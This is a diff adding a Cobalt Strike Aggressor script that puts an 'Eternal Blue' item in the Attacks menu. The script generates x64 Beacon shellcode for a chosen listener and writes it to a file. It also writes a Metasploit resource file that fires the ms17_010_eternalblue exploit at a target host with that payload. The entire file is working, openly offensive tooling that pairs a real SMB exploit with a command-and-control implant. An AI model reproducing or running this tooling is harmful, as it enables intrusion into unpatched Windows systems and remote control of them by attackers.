@@ -1,0 +1,65 @@
+#
+# script to help move around with ms17-010 from Metasploit
+# Go to Attacks -> Eternal Blue
+#
+
+# target, listener, where to save .rc file
+sub generate_rc_file {
+	local('$target $listener $where $handle $shellcode');
+	($target, $listener, $where) = @_;
+
+	# generate our shellcode
+	$shellcode = shellcode($listener, true, "x64");
+	if ($shellcode is $null) {
+		return "ERROR: There is no x64 shellcode for $listener";
+	}
+
+	# write out our shellcode
+	$handle = openf("> $+ $where $+ .bin");
+	writeb($handle, $shellcode);
+	closef($handle);
+
+	# write out our .rc file
+	$handle = openf("> $+ $where");
+	println($handle, "use exploit/windows/smb/ms17_010_eternalblue ");
+	println($handle, "set RHOST $target");
+	println($handle, "set PAYLOAD generic/custom");
+	println($handle, "set PAYLOADFILE $where $+ .bin");
+	println($handle, "set MaxExploitAttempts 1");
+	println($handle, "exploit -j");
+	closef($handle);
+
+	# tell the user what to do!
+	return "resource $where";
+}
+
+sub generate_rc_file_prompt {
+	# ask where to save it
+	prompt_file_save("launch.rc", lambda({
+		# generate our .rc file
+		local('$run');
+		$run = generate_rc_file($args['target'], $args['listener'], $1);
+
+		# tell the user about it! 
+		prompt_text("Run this command in Metasploit: ", $run, {}); 
+	}, $args => $3));
+}
+
+# the dialog, nothing fancy!
+sub openEternalBlueDialog {
+	$dialog = dialog("ms17-010", %(), &generate_rc_file_prompt);
+	dialog_description($dialog, "Generate a Metasploit Framework .rc file to deliver a Cobalt Strike Beacon with ms17-010. x64 Targets only!");
+	
+	drow_text($dialog,         "target",   "Target:");
+	drow_listener($dialog,     "listener", "Listener:");
+
+	dbutton_action($dialog, "Generate");
+	dialog_show($dialog);
+}
+
+#
+popup attacks {
+	item "&Eternal Blue" {
+		openEternalBlueDialog();
+	}
+}
